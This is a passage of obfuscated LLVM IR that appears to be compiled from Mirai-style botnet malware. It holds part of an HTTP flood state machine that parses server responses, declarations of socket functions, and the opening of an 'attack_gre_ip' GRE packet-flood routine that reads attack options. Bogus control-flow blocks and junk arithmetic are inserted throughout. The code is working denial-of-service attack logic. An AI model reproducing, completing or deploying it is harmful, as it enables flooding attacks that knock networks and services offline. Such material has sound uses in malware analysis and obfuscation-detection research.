  %gen510 = add i32 %_509, 1
  %_511 = sub i32 0, %4723
  %gen512 = add i32 %_511, 1
  %4724 = add nsw i32 %4723, 1
  store i32 %4724, i32* %60, align 4
  br label %originalBB507

originalBB516alteredBB:                           ; preds = %originalBB516, %2492
  %4725 = load i32, i32* %18, align 4
  %_517 = shl i32 %4725, 1
  %_518 = sub i32 %4725, 1
  %gen519 = mul i32 %_518, 1
  %_520 = sub i32 0, %4725
  %gen521 = add i32 %_520, 1
  %_522 = sub i32 0, %4725
  %gen523 = add i32 %_522, 1
  %_524 = sub i32 %4725, 1
  %gen525 = mul i32 %_524, 1
  %_526 = sub i32 %4725, 1
  %gen527 = mul i32 %_526, 1
  %4726 = add nsw i32 %4725, 1
  store i32 %4726, i32* %18, align 4
  br label %originalBB516

originalBB531alteredBB:                           ; preds = %originalBB531, %2529
  %4727 = load i8*, i8** %62, align 8
  %4728 = load i32, i32* %18, align 4
  %4729 = sext i32 %4728 to i64
  %4730 = getelementptr inbounds i8, i8* %4727, i64 %4729
  %4731 = load i8, i8* %4730, align 1
  %4732 = sext i8 %4731 to i32
  %4733 = icmp eq i32 %4732, 47
  br label %originalBB531

originalBB535alteredBB:                           ; preds = %originalBB535, %2558
  %4734 = load i32, i32* %18, align 4
  %_536 = sub i32 %4734, 1
  %gen537 = mul i32 %_536, 1
  %_538 = sub i32 %4734, 1
  %gen539 = mul i32 %_538, 1
  %_540 = shl i32 %4734, 1
  %_541 = sub i32 0, %4734
  %gen542 = add i32 %_541, 1
  %4735 = add nsw i32 %4734, 1
  store i32 %4735, i32* %18, align 4
  br label %originalBB535

originalBB546alteredBB:                           ; preds = %originalBB546, %2577
  %4736 = load i8*, i8** %62, align 8
  %4737 = call i32 @util_strlen(i8* %4736)
  %4738 = icmp sgt i32 %4737, 0
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %2658
  %4739 = load i8*, i8** %62, align 8
  %4740 = load i32, i32* %18, align 4
  %_551 = shl i32 %4740, 1
  %_552 = sub i32 0, %4740
  %gen553 = add i32 %_552, 1
  %_554 = sub i32 0, %4740
  %gen555 = add i32 %_554, 1
  %4741 = add nsw i32 %4740, 1
  %4742 = sext i32 %4741 to i64
  %4743 = getelementptr inbounds i8, i8* %4739, i64 %4742
  %4744 = call i32 @util_strlen(i8* %4743)
  %4745 = icmp slt i32 %4744, 256
  br label %originalBB550

originalBB559alteredBB:                           ; preds = %originalBB559, %2682
  %4746 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4747 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4746, i32 0, i32 6
  %4748 = getelementptr inbounds [257 x i8], [257 x i8]* %4747, i32 0, i32 0
  %4749 = getelementptr inbounds i8, i8* %4748, i64 1
  %4750 = load i8*, i8** %62, align 8
  %4751 = load i32, i32* %18, align 4
  %_560 = shl i32 %4751, 1
  %_561 = sub i32 %4751, 1
  %gen562 = mul i32 %_561, 1
  %_563 = sub i32 %4751, 1
  %gen564 = mul i32 %_563, 1
  %_565 = sub i32 %4751, 1
  %gen566 = mul i32 %_565, 1
  %_567 = sub i32 %4751, 1
  %gen568 = mul i32 %_567, 1
  %_569 = sub i32 0, %4751
  %gen570 = add i32 %_569, 1
  %_571 = shl i32 %4751, 1
  %4752 = add nsw i32 %4751, 1
  %4753 = sext i32 %4752 to i64
  %4754 = getelementptr inbounds i8, i8* %4750, i64 %4753
  %4755 = call i32 @util_strcpy(i8* %4749, i8* %4754)
  br label %originalBB559

originalBB575alteredBB:                           ; preds = %originalBB575, %2709
  br label %originalBB575

originalBB579alteredBB:                           ; preds = %originalBB579, %2731
  %4756 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4757 = load i32, i32* %20, align 4
  %4758 = call i8* @table_retrieve_val(i32 44, i32* null)
  %4759 = call i32 @util_stristr(i8* %4756, i32 %4757, i8* %4758)
  %4760 = icmp ne i32 %4759, -1
  br label %originalBB579

originalBB583alteredBB:                           ; preds = %originalBB583, %2753
  %4761 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4762 = load i32, i32* %20, align 4
  %4763 = call i8* @table_retrieve_val(i32 44, i32* null)
  %4764 = call i32 @util_stristr(i8* %4761, i32 %4762, i8* %4763)
  store i32 %4764, i32* %63, align 4
  %4765 = load i32, i32* %63, align 4
  %4766 = sext i32 %4765 to i64
  %4767 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4766
  %4768 = load i8, i8* %4767, align 1
  %4769 = sext i8 %4768 to i32
  %4770 = icmp eq i32 %4769, 32
  br label %originalBB583

originalBB587alteredBB:                           ; preds = %originalBB587, %2803
  %4771 = load i32, i32* %63, align 4
  %4772 = load i32, i32* %64, align 4
  %_588 = shl i32 %4771, %4772
  %_589 = shl i32 %4771, %4772
  %_590 = sub i32 0, %4771
  %gen591 = add i32 %_590, %4772
  %4773 = add nsw i32 %4771, %4772
  %4774 = sext i32 %4773 to i64
  %4775 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4774
  store i8 0, i8* %4775, align 1
  %4776 = load i32, i32* %64, align 4
  %_592 = sub i32 0, %4776
  %gen593 = add i32 %_592, 1
  %_594 = sub i32 %4776, 1
  %gen595 = mul i32 %_594, 1
  %_596 = shl i32 %4776, 1
  %_597 = sub i32 0, %4776
  %gen598 = add i32 %_597, 1
  %_599 = shl i32 %4776, 1
  %4777 = add nsw i32 %4776, 1
  store i32 %4777, i32* %64, align 4
  store i32 0, i32* %18, align 4
  br label %originalBB587

originalBB603alteredBB:                           ; preds = %originalBB603, %2827
  %4778 = load i8*, i8** %65, align 8
  %4779 = load i32, i32* %18, align 4
  %4780 = sext i32 %4779 to i64
  %4781 = getelementptr inbounds i8, i8* %4778, i64 %4780
  %4782 = load i8, i8* %4781, align 1
  %4783 = sext i8 %4782 to i32
  %4784 = icmp ne i32 %4783, 0
  br label %originalBB603

originalBB607alteredBB:                           ; preds = %originalBB607, %2867
  br label %originalBB607

originalBB611alteredBB:                           ; preds = %originalBB611, %2888
  %4785 = load i8*, i8** %65, align 8
  %4786 = load i32, i32* %18, align 4
  %4787 = sext i32 %4786 to i64
  %4788 = getelementptr inbounds i8, i8* %4785, i64 %4787
  %4789 = load i8, i8* %4788, align 1
  %4790 = sext i8 %4789 to i32
  %4791 = icmp ne i32 %4790, 0
  br label %originalBB611

originalBB615alteredBB:                           ; preds = %originalBB615, %2912
  store i32 0, i32* %66, align 4
  %4792 = load i8*, i8** %65, align 8
  %4793 = load i32, i32* %18, align 4
  %4794 = sext i32 %4793 to i64
  %4795 = getelementptr inbounds i8, i8* %4792, i64 %4794
  store i8 0, i8* %4795, align 1
  %4796 = load i32, i32* %18, align 4
  %4797 = add nsw i32 %4796, 1
  store i32 %4797, i32* %18, align 4
  %4798 = load i8*, i8** %65, align 8
  %4799 = load i32, i32* %18, align 4
  %4800 = sext i32 %4799 to i64
  %4801 = getelementptr inbounds i8, i8* %4798, i64 %4800
  %4802 = load i8, i8* %4801, align 1
  %4803 = sext i8 %4802 to i32
  %4804 = icmp eq i32 %4803, 32
  br label %originalBB615

originalBB619alteredBB:                           ; preds = %originalBB619, %2957
  %4805 = load i8*, i8** %65, align 8
  %4806 = load i32, i32* %18, align 4
  %4807 = sext i32 %4806 to i64
  %4808 = getelementptr inbounds i8, i8* %4805, i64 %4807
  %4809 = load i8*, i8** %65, align 8
  %4810 = load i32, i32* %18, align 4
  %4811 = sext i32 %4810 to i64
  %4812 = getelementptr inbounds i8, i8* %4809, i64 %4811
  %4813 = call i32 @util_strlen(i8* %4812)
  %4814 = call i32 @util_stristr(i8* %4808, i32 %4813, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4815 = load i32, i32* %18, align 4
  %_620 = sub i32 %4815, %4814
  %gen621 = mul i32 %_620, %4814
  %4816 = add nsw i32 %4815, %4814
  store i32 %4816, i32* %18, align 4
  br label %originalBB619

originalBB625alteredBB:                           ; preds = %originalBB625, %2986
  %4817 = load i8*, i8** %65, align 8
  %4818 = load i32, i32* %18, align 4
  %4819 = sext i32 %4818 to i64
  %4820 = getelementptr inbounds i8, i8* %4817, i64 %4819
  %4821 = load i8, i8* %4820, align 1
  %4822 = sext i8 %4821 to i32
  %4823 = icmp eq i32 %4822, 34
  br label %originalBB625

originalBB629alteredBB:                           ; preds = %originalBB629, %3041
  br label %originalBB629

originalBB633alteredBB:                           ; preds = %originalBB633, %3058
  %4824 = load i8*, i8** %65, align 8
  %4825 = call i32 @util_atoi(i8* %4824, i32 10)
  store i32 %4825, i32* %66, align 4
  br label %originalBB633

originalBB637alteredBB:                           ; preds = %originalBB637, %3092
  %4826 = call i32 @sleep(i32 1)
  br label %originalBB637

originalBB641alteredBB:                           ; preds = %originalBB641, %3155
  %4827 = load i8*, i8** %65, align 8
  %4828 = load i32, i32* %18, align 4
  %4829 = sext i32 %4828 to i64
  %4830 = getelementptr inbounds i8, i8* %4827, i64 %4829
  store i8 0, i8* %4830, align 1
  br label %originalBB641

originalBB645alteredBB:                           ; preds = %originalBB645, %3187
  %4831 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4832 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4831, i32 0, i32 7
  %4833 = getelementptr inbounds [129 x i8], [129 x i8]* %4832, i32 0, i32 0
  %4834 = load i8*, i8** %65, align 8
  %4835 = call i32 @util_strcpy(i8* %4833, i8* %4834)
  br label %originalBB645

originalBB649alteredBB:                           ; preds = %originalBB649, %3241
  br label %originalBB649

originalBB653alteredBB:                           ; preds = %originalBB653, %3272
  %4836 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4837 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4836, i32 0, i32 6
  %4838 = getelementptr inbounds [257 x i8], [257 x i8]* %4837, i32 0, i32 0
  %4839 = getelementptr inbounds i8, i8* %4838, i64 1
  call void @util_zero(i8* %4839, i32 255)
  %4840 = load i8*, i8** %65, align 8
  %4841 = load i32, i32* %18, align 4
  %_654 = shl i32 %4841, 1
  %_655 = shl i32 %4841, 1
  %_656 = sub i32 %4841, 1
  %gen657 = mul i32 %_656, 1
  %_658 = sub i32 %4841, 1
  %gen659 = mul i32 %_658, 1
  %_660 = sub i32 %4841, 1
  %gen661 = mul i32 %_660, 1
  %4842 = add nsw i32 %4841, 1
  %4843 = sext i32 %4842 to i64
  %4844 = getelementptr inbounds i8, i8* %4840, i64 %4843
  %4845 = call i32 @util_strlen(i8* %4844)
  %4846 = icmp sgt i32 %4845, 0
  br label %originalBB653

originalBB665alteredBB:                           ; preds = %originalBB665, %3322
  br label %originalBB665

originalBB669alteredBB:                           ; preds = %originalBB669, %3349
  %4847 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4847, i32 0, i32 9
  %4849 = getelementptr inbounds [9 x i8], [9 x i8]* %4848, i32 0, i32 0
  %4850 = call signext i8 @util_strcmp(i8* %4849, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %4851 = sext i8 %4850 to i32
  %4852 = icmp ne i32 %4851, 0
  br label %originalBB669

originalBB673alteredBB:                           ; preds = %originalBB673, %3372
  %4853 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4853, i32 0, i32 1
  store i8 7, i8* %4854, align 4
  br label %originalBB673

originalBB677alteredBB:                           ; preds = %originalBB677, %3418
  %4855 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4856 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4855, i32 0, i32 1
  %4857 = load i8, i8* %4856, align 4
  %4858 = zext i8 %4857 to i32
  %4859 = icmp ne i32 %4858, 7
  br label %originalBB677

originalBB681alteredBB:                           ; preds = %originalBB681, %3485
  %4860 = call i32* @__errno_location() #7
  %4861 = load i32, i32* %4860, align 4
  %4862 = icmp ne i32 %4861, 11
  br label %originalBB681

originalBB685alteredBB:                           ; preds = %originalBB685, %3528
  store i32 0, i32* %67, align 4
  %4863 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4864 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4863, i32 0, i32 14
  %4865 = load i32, i32* %4864, align 4
  %4866 = icmp sgt i32 %4865, 0
  br label %originalBB685

originalBB689alteredBB:                           ; preds = %originalBB689, %3565
  store i32 %3566, i32* %67, align 4
  %4867 = load i32, i32* %67, align 4
  %4868 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4869 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4868, i32 0, i32 14
  %4870 = load i32, i32* %4869, align 4
  %4871 = sub nsw i32 %4870, %4867
  store i32 %4871, i32* %4869, align 4
  %4872 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4873 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4872, i32 0, i32 11
  %4874 = load i32, i32* %4873, align 4
  %4875 = icmp eq i32 %4874, 1
  br label %originalBB689

originalBB693alteredBB:                           ; preds = %originalBB693, %3642
  %4876 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4876, i32 0, i32 16
  %4878 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4879 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4878, i32 0, i32 15
  %4880 = load i32, i32* %4879, align 4
  %4881 = sext i32 %4880 to i64
  %4882 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4877, i64 0, i64 %4881
  %4883 = getelementptr inbounds [128 x i8], [128 x i8]* %4882, i32 0, i32 0
  %4884 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4885 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4884, i32 0, i32 18
  %4886 = load i32, i32* %68, align 4
  %4887 = sext i32 %4886 to i64
  %4888 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4885, i64 0, i64 %4887
  %4889 = call i32 @util_strcpy(i8* %4883, i8* %4888)
  %4890 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4890, i32 0, i32 16
  %4892 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4893 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4892, i32 0, i32 15
  %4894 = load i32, i32* %4893, align 4
  %4895 = sext i32 %4894 to i64
  %4896 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4891, i64 0, i64 %4895
  %4897 = getelementptr inbounds [128 x i8], [128 x i8]* %4896, i32 0, i32 0
  %4898 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4899 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4898, i32 0, i32 16
  %4900 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4901 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4900, i32 0, i32 15
  %4902 = load i32, i32* %4901, align 4
  %4903 = sext i32 %4902 to i64
  %4904 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4899, i64 0, i64 %4903
  %4905 = getelementptr inbounds [128 x i8], [128 x i8]* %4904, i32 0, i32 0
  %4906 = call i32 @util_strlen(i8* %4905)
  %4907 = sext i32 %4906 to i64
  %4908 = getelementptr inbounds i8, i8* %4897, i64 %4907
  %4909 = call i32 @util_strcpy(i8* %4908, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %4910 = load i32, i32* %69, align 4
  %_694 = shl i32 %4910, 3
  %4911 = add nsw i32 %4910, 3
  %4912 = load i32, i32* %68, align 4
  %_695 = shl i32 %4912, %4911
  %4913 = add nsw i32 %4912, %4911
  store i32 %4913, i32* %68, align 4
  %4914 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4914, i32 0, i32 18
  %4916 = load i32, i32* %68, align 4
  %4917 = sext i32 %4916 to i64
  %4918 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4915, i64 0, i64 %4917
  %4919 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4920 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4919, i32 0, i32 17
  %4921 = load i32, i32* %4920, align 4
  %4922 = load i32, i32* %68, align 4
  %_696 = sub i32 %4921, %4922
  %gen697 = mul i32 %_696, %4922
  %_698 = sub i32 0, %4921
  %gen699 = add i32 %_698, %4922
  %4923 = sub nsw i32 %4921, %4922
  %4924 = call i32 @util_memsearch(i8* %4918, i32 %4923, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %4924, i32* %69, align 4
  %4925 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4926 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4925, i32 0, i32 18
  %4927 = load i32, i32* %68, align 4
  %4928 = load i32, i32* %69, align 4
  %_700 = sub i32 %4928, 1
  %gen701 = mul i32 %_700, 1
  %_702 = shl i32 %4928, 1
  %_703 = sub i32 %4928, 1
  %gen704 = mul i32 %_703, 1
  %_705 = sub i32 %4928, 1
  %gen706 = mul i32 %_705, 1
  %_707 = sub i32 %4928, 1
  %gen708 = mul i32 %_707, 1
  %_709 = sub i32 0, %4928
  %gen710 = add i32 %_709, 1
  %_711 = sub i32 0, %4928
  %gen712 = add i32 %_711, 1
  %4929 = sub nsw i32 %4928, 1
  %4930 = add nsw i32 %4927, %4929
  %4931 = sext i32 %4930 to i64
  %4932 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4926, i64 0, i64 %4931
  store i8 0, i8* %4932, align 1
  %4933 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4934 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4933, i32 0, i32 16
  %4935 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4936 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4935, i32 0, i32 15
  %4937 = load i32, i32* %4936, align 4
  %4938 = sext i32 %4937 to i64
  %4939 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4934, i64 0, i64 %4938
  %4940 = getelementptr inbounds [128 x i8], [128 x i8]* %4939, i32 0, i32 0
  %4941 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4941, i32 0, i32 16
  %4943 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4944 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4943, i32 0, i32 15
  %4945 = load i32, i32* %4944, align 4
  %4946 = sext i32 %4945 to i64
  %4947 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4942, i64 0, i64 %4946
  %4948 = getelementptr inbounds [128 x i8], [128 x i8]* %4947, i32 0, i32 0
  %4949 = call i32 @util_strlen(i8* %4948)
  %4950 = sext i32 %4949 to i64
  %4951 = getelementptr inbounds i8, i8* %4940, i64 %4950
  %4952 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4953 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4952, i32 0, i32 18
  %4954 = load i32, i32* %68, align 4
  %4955 = sext i32 %4954 to i64
  %4956 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4953, i64 0, i64 %4955
  %4957 = call i32 @util_strcpy(i8* %4951, i8* %4956)
  %4958 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4959 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4958, i32 0, i32 15
  %4960 = load i32, i32* %4959, align 4
  %_713 = shl i32 %4960, 1
  %_714 = sub i32 %4960, 1
  %gen715 = mul i32 %_714, 1
  %_716 = sub i32 %4960, 1
  %gen717 = mul i32 %_716, 1
  %4961 = add nsw i32 %4960, 1
  store i32 %4961, i32* %4959, align 4
  br label %originalBB693

originalBB721alteredBB:                           ; preds = %originalBB721, %3771
  %4962 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4963 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4962, i32 0, i32 18
  %4964 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4963, i32 0, i32 0
  %4965 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4966 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4965, i32 0, i32 17
  %4967 = load i32, i32* %4966, align 4
  %4968 = call i32 @util_memsearch(i8* %4964, i32 %4967, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4968, i32* %70, align 4
  %4969 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4969, i32 0, i32 18
  %4971 = load i32, i32* %70, align 4
  %_722 = shl i32 %4971, 2
  %_723 = sub i32 0, %4971
  %gen724 = add i32 %_723, 2
  %_725 = shl i32 %4971, 2
  %_726 = sub i32 0, %4971
  %gen727 = add i32 %_726, 2
  %_728 = sub i32 0, %4971
  %gen729 = add i32 %_728, 2
  %_730 = shl i32 %4971, 2
  %_731 = shl i32 %4971, 2
  %_732 = sub i32 %4971, 2
  %gen733 = mul i32 %_732, 2
  %_734 = sub i32 0, %4971
  %gen735 = add i32 %_734, 2
  %4972 = sub nsw i32 %4971, 2
  %4973 = sext i32 %4972 to i64
  %4974 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4970, i64 0, i64 %4973
  store i8 0, i8* %4974, align 1
  %4975 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4975, i32 0, i32 18
  %4977 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4976, i32 0, i32 0
  %4978 = load i32, i32* %70, align 4
  %4979 = call i32 @util_memsearch(i8* %4977, i32 %4978, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4980 = icmp ne i32 %4979, -1
  br label %originalBB721

originalBB739alteredBB:                           ; preds = %originalBB739, %3807
  %4981 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4981, i32 0, i32 18
  %4983 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4983, i32 0, i32 18
  %4985 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4984, i32 0, i32 0
  %4986 = load i32, i32* %70, align 4
  %4987 = call i32 @util_memsearch(i8* %4985, i32 %4986, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4988 = sext i32 %4987 to i64
  %4989 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4982, i64 0, i64 %4988
  store i8 0, i8* %4989, align 1
  br label %originalBB739

originalBB743alteredBB:                           ; preds = %originalBB743, %3833
  %4990 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4991 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4990, i32 0, i32 18
  %4992 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4991, i32 0, i32 0
  %4993 = call i32 @util_atoi(i8* %4992, i32 16)
  store i32 %4993, i32* %71, align 4
  %4994 = load i32, i32* %71, align 4
  %4995 = icmp eq i32 %4994, 0
  br label %originalBB743

originalBB747alteredBB:                           ; preds = %originalBB747, %3856
  %4996 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4997 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4996, i32 0, i32 1
  store i8 1, i8* %4997, align 4
  br label %originalBB747

originalBB751alteredBB:                           ; preds = %originalBB751, %3881
  br label %originalBB751

originalBB755alteredBB:                           ; preds = %originalBB755, %3915
  %4998 = load i32, i32* %67, align 4
  %4999 = icmp eq i32 %4998, 0
  br label %originalBB755

originalBB759alteredBB:                           ; preds = %originalBB759, %3934
  br label %originalBB759

originalBB763alteredBB:                           ; preds = %originalBB763, %3985
  br label %originalBB763

originalBB767alteredBB:                           ; preds = %originalBB767, %4019
  %5000 = call i32* @__errno_location() #7
  store i32 104, i32* %5000, align 4
  store i32 -1, i32* %20, align 4
  br label %originalBB767

originalBB771alteredBB:                           ; preds = %originalBB771, %4044
  %5001 = call i32* @__errno_location() #7
  %5002 = load i32, i32* %5001, align 4
  %5003 = icmp ne i32 %5002, 11
  br label %originalBB771

originalBB775alteredBB:                           ; preds = %originalBB775, %4084
  br label %originalBB775

originalBB779alteredBB:                           ; preds = %originalBB779, %4101
  br label %originalBB779

originalBB783alteredBB:                           ; preds = %originalBB783, %4119
  br label %originalBB783

originalBB787alteredBB:                           ; preds = %originalBB787, %4137
  %5004 = load i32, i32* %17, align 4
  %_788 = sub i32 0, %5004
  %gen789 = add i32 %_788, 1
  %_790 = shl i32 %5004, 1
  %5005 = add nsw i32 %5004, 1
  store i32 %5005, i32* %17, align 4
  br label %originalBB787
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #5

declare i32 @sleep(i32) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
